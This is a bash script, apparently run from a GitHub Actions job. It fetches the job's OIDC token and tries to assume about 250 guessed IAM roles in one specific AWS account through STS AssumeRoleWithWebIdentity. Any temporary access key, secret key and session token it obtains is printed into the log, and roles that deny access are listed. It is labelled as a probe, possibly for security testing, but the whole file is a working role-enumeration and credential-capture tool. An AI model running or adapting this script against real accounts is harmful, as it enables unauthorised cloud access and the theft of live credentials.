#!/bin/bash
# intent 280559 GitHub OIDC -> STS AssumeRoleWithWebIdentity name-replay probe
set -u
echo "=== BEGIN 280559 PROBE ==="
echo "egress_ip: $(curl -4 -s -m 10 https://api.ipify.org 2>/dev/null)"
echo "repo: ${GITHUB_REPOSITORY:-?} ref: ${GITHUB_REF:-?} event: ${GITHUB_EVENT_NAME:-?}"
if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO_OIDC_ENV abort"; exit 0; fi
get_tok(){ curl -s -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" -o /tmp/tok.json; python3 -c "import json;print(json.load(open('/tmp/tok.json')).get('value',''))"; }
JWT=$(get_tok "sts.amazonaws.com")
echo "claims:"; python3 - "$JWT" <<'PYX'
import base64,json,sys
j=sys.argv[1].strip()
def dec(x):
    x+='='*(-len(x)%4); return json.loads(base64.urlsafe_b64decode(x))
try:
    h=dec(j.split('.')[0]); p=dec(j.split('.')[1])
    print(json.dumps({k:p.get(k) for k in ('iss','aud','sub','repository','repository_owner','event_name','ref')},sort_keys=True))
except Exception as e:
    print("claims_parse_fail",e)
PYX
ACCT="533852667875"
roles=()
while IFS= read -r n; do [ -n "$n" ] && roles+=("$n"); done <<'ROLES'
cg-ci-gcp-oidc-role-prod
cg-ci-google-oidc-role
cg-ci-google-oidc-role-prod
cg-ci-oidc-prod-role
cg-ci-oidc-role
cg-ci-oidc-role-prod
cg-cicd-gcp-oidc-role-prod
cg-cicd-google-oidc-role
cg-cicd-google-oidc-role-prod
cg-cicd-oidc-prod-role
cg-cicd-oidc-role
cg-cicd-oidc-role-prod
cg-core-github-oidc-role-prod
cg-deploy-gcp-oidc-role-prod
cg-deploy-google-oidc-role
cg-deploy-google-oidc-role-prod
cg-deploy-oidc-prod-role
cg-deploy-oidc-role
cg-github-actions-role
cg-github-oidc-prod
cg-github-oidc-role-prod
cg-testas-github-oidc-prod
cg-accounts-gcp-oidc-role-prod
cg-accounts-google-oidc-role
cg-accounts-google-oidc-role-prod
cg-accounts-oidc-prod-role
cg-accounts-oidc-role
cg-accounts-oidc-role-prod
cg-admin-gcp-oidc-role-prod
cg-admin-google-oidc-role
cg-admin-google-oidc-role-prod
cg-admin-oidc-prod-role
cg-admin-oidc-role
cg-admin-oidc-role-prod
cg-analytics-oidc-role
cg-api-gcp-oidc-role-prod
cg-api-google-oidc-role
cg-api-google-oidc-role-prod
cg-api-oidc-prod-role
cg-api-oidc-role
cg-api-oidc-role-prod
cg-app-gcp-oidc-role-prod
cg-app-google-oidc-role
cg-app-google-oidc-role-prod
cg-app-oidc-prod-role
cg-app-oidc-role
cg-app-oidc-role-prod
cg-app-prod-gcp-oidc-role-prod
cg-app-prod-google-oidc-role
cg-app-prod-google-oidc-role-prod
cg-app-prod-oidc-prod-role
cg-app-prod-oidc-role
cg-app-prod-oidc-role-prod
cg-backup-gcp-oidc-role-prod
cg-backup-google-oidc-role
cg-backup-google-oidc-role-prod
cg-backup-oidc-prod-role
cg-backup-oidc-role
cg-backup-oidc-role-prod
cg-billing-gcp-oidc-role-prod
cg-billing-google-oidc-role
cg-billing-google-oidc-role-prod
cg-billing-oidc-prod-role
cg-billing-oidc-role
cg-billing-oidc-role-prod
cg-btc-gcp-oidc-role-prod
cg-btc-google-oidc-role
cg-btc-google-oidc-role-prod
cg-btc-oidc-prod-role
cg-btc-oidc-role
cg-btc-oidc-role-prod
cg-checkout-gcp-oidc-role-prod
cg-checkout-google-oidc-role
cg-checkout-google-oidc-role-prod
cg-checkout-oidc-prod-role
cg-checkout-oidc-role
cg-checkout-oidc-role-prod
cg-ci-federation-role-prod
cg-ci-google-federation-role
cg-ci-role-prod
cg-ci-web-identity-role-prod
cg-cicd-federation-role-prod
cg-cicd-google-federation-role
cg-cicd-web-identity-role-prod
cg-core-ci-role-prod
cg-core-deploy-role-prod
cg-core-ecs-tasks-role-prod
cg-core-gcp-oidc-role-prod
cg-core-google-oidc-role
cg-core-google-oidc-role-prod
cg-core-oidc-prod-role
cg-core-oidc-role
cg-core-oidc-role-prod
cg-dashboard-gcp-oidc-role-prod
cg-dashboard-google-oidc-role
cg-dashboard-google-oidc-role-prod
cg-dashboard-oidc-prod-role
cg-dashboard-oidc-role
cg-dashboard-oidc-role-prod
cg-data-gcp-oidc-role-prod
cg-data-google-oidc-role
cg-data-google-oidc-role-prod
cg-data-oidc-prod-role
cg-data-oidc-role
cg-data-oidc-role-prod
cg-deploy-federation-role-prod
cg-deploy-google-federation-role
cg-deploy-web-identity-role-prod
cg-devops-gcp-oidc-role-prod
cg-devops-google-oidc-role
cg-devops-google-oidc-role-prod
cg-devops-oidc-prod-role
cg-devops-oidc-role
cg-eks-gcp-oidc-role-prod
cg-eks-google-oidc-role
cg-eks-google-oidc-role-prod
cg-eks-oidc-prod-role
cg-eks-oidc-role
cg-eks-oidc-role-prod
cg-eth-gcp-oidc-role-prod
cg-eth-google-oidc-role
cg-eth-google-oidc-role-prod
cg-eth-oidc-prod-role
cg-eth-oidc-role
cg-eth-oidc-role-prod
cg-exchange-gcp-oidc-role-prod
cg-exchange-google-oidc-role
cg-exchange-google-oidc-role-prod
cg-exchange-oidc-prod-role
cg-exchange-oidc-role
cg-exchange-oidc-role-prod
cg-firebase-oidc-role
cg-gateway-gcp-oidc-role-prod
cg-gateway-google-oidc-role
cg-gateway-google-oidc-role-prod
cg-gateway-oidc-prod-role
cg-gateway-oidc-role
cg-gateway-oidc-role-prod
cg-gcp-gcp-oidc-role-prod
cg-gcp-google-oidc-role
cg-gcp-google-oidc-role-prod
cg-gcp-oidc-prod-role
cg-gcp-oidc-role
cg-gcp-oidc-role-prod
cg-giftcards-gcp-oidc-role-prod
cg-giftcards-google-oidc-role
cg-giftcards-google-oidc-role-prod
cg-giftcards-oidc-prod-role
cg-giftcards-oidc-role
cg-giftcards-oidc-role-prod
cg-google-gcp-oidc-role-prod
cg-google-google-oidc-role
cg-google-google-oidc-role-prod
cg-google-oidc
cg-google-oidc-prod-role
cg-google-oidc-role-prod
cg-identity-gcp-oidc-role-prod
cg-identity-google-oidc-role
cg-identity-google-oidc-role-prod
cg-identity-oidc-prod-role
cg-identity-oidc-role
cg-identity-oidc-role-prod
cg-infra-gcp-oidc-role-prod
cg-infra-google-oidc-role
cg-infra-google-oidc-role-prod
cg-infra-oidc-prod-role
cg-infra-oidc-role
cg-k8s-gcp-oidc-role-prod
cg-k8s-google-oidc-role
cg-k8s-google-oidc-role-prod
cg-k8s-oidc-prod-role
cg-k8s-oidc-role
cg-k8s-oidc-role-prod
cg-main-gcp-oidc-role-prod
cg-main-google-oidc-role
cg-main-google-oidc-role-prod
cg-main-oidc-prod-role
cg-main-oidc-role
cg-main-oidc-role-prod
cg-oidc
cg-oidc-federated-role
cg-oidc-federation-role
cg-oidc-role-prod
cg-ops-gcp-oidc-role-prod
cg-ops-google-oidc-role
cg-ops-google-oidc-role-prod
cg-ops-oidc-prod-role
cg-ops-oidc-role
cg-ops-oidc-role-prod
cg-pay-gcp-oidc-role-prod
cg-pay-google-oidc-role
cg-pay-google-oidc-role-prod
cg-pay-oidc-prod-role
cg-pay-oidc-role
cg-pay-oidc-role-prod
cg-payments-gcp-oidc-role-prod
cg-payments-google-oidc-role
cg-payments-google-oidc-role-prod
cg-payments-oidc-prod-role
cg-payments-oidc-role
cg-payments-oidc-role-prod
cg-payout-gcp-oidc-role-prod
cg-payout-google-oidc-role
cg-payout-google-oidc-role-prod
cg-payout-oidc-prod-role
cg-payout-oidc-role
cg-payout-oidc-role-prod
cg-platform-gcp-oidc-role-prod
cg-platform-google-oidc-role
cg-platform-google-oidc-role-prod
cg-platform-oidc-prod-role
cg-platform-oidc-role
cg-platform-oidc-role-prod
cg-prod-gcp-oidc-role-prod
cg-prod-google-oidc-role
cg-prod-google-oidc-role-prod
cg-prod-oidc
cg-prod-oidc-prod-role
cg-prod-oidc-role-prod
cg-s3-gcp-oidc-role-prod
cg-s3-google-oidc-role
cg-s3-google-oidc-role-prod
cg-s3-oidc-prod-role
cg-s3-oidc-role
cg-s3-oidc-role-prod
cg-sandbox-gcp-oidc-role-prod
cg-sandbox-google-oidc-role
cg-sandbox-google-oidc-role-prod
cg-sandbox-oidc-prod-role
cg-sandbox-oidc-role
cg-sandbox-oidc-role-prod
cg-security-gcp-oidc-role-prod
cg-security-google-oidc-role
cg-security-google-oidc-role-prod
ROLES
echo "role_count: ${#roles[@]}"
ok=0; ad=0; other=0; adlist=""
for n in "${roles[@]}"; do
  arn="arn:aws:iam::${ACCT}:role/${n}"
  for attempt in 1 2; do
    curl -s -m 25 -X POST https://sts.amazonaws.com/ \
      --data-urlencode "Action=AssumeRoleWithWebIdentity" \
      --data-urlencode "Version=2011-06-15" \
      --data-urlencode "RoleArn=${arn}" \
      --data-urlencode "RoleSessionName=cg280559" \
      --data-urlencode "WebIdentityToken=${JWT}" \
      --data-urlencode "DurationSeconds=3600" -o /tmp/sts.xml -w "%{http_code}" > /tmp/hc 2>/dev/null
    hc=$(cat /tmp/hc)
    code=$(python3 - <<'PYX'
import xml.etree.ElementTree as ET
try:
  r=ET.parse('/tmp/sts.xml').getroot()
  ns={'s':'https://sts.amazonaws.com/doc/2011-06-15/'}
  e=r.find('.//s:Error/s:Code',ns)
  if e is None:
    e=r.find('.//Error/Code')
  print(e.text if e is not None else 'OK')
except Exception as ex:
  print('PARSEFAIL')
PYX
)
    if [ "$code" = "Throttling" ] && [ "$attempt" = "1" ]; then sleep 1; continue; fi
    break
  done
  if [ "$code" = "OK" ]; then
    ok=$((ok+1))
    echo "HIT role=$n http=$hc"
    python3 - <<'PYX'
import xml.etree.ElementTree as ET
r=ET.parse('/tmp/sts.xml').getroot()
ns={'s':'https://sts.amazonaws.com/doc/2011-06-15/'}
def g(p):
    e=r.find(p,ns); return e.text if e is not None else ''
ak=g('.//s:Credentials/s:AccessKeyId'); sk=g('.//s:Credentials/s:SecretAccessKey'); st=g('.//s:Credentials/s:SessionToken'); arn=g('.//s:AssumedRoleUser/s:Arn')
print("CREDS_BEGIN")
print("AK="+ak); print("SK="+sk); print("ST="+st); print("ARN="+arn)
print("CREDS_END")
PYX
    break
  elif [ "$code" = "AccessDenied" ]; then
    ad=$((ad+1)); adlist="$adlist $n"
  else
    other=$((other+1)); echo "OTHER role=$n http=$hc code=$code"
  fi
  echo "r $n $code"
  sleep 0.15
done
echo "=== SUMMARY ok=$ok accessdenied=$ad other=$other total=${#roles[@]} ==="
echo "ADLIST:$adlist"
echo "=== END 280559 PROBE ==="
